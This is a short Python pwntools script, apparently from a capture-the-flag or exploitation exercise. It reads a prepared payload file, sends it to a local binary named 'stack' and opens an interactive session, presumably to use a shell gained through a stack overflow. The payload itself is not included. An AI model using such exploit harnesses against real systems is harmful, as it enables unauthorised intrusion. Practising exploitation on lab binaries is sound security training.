from pwn import *
context.log_level = 'debug'
f = open('./stexp/exp.0','rb')
input = f.read()
pro = process('./stack')
#raw_input()
#print input
pro.send(input)
#print pro.recv()
pro.interactive()
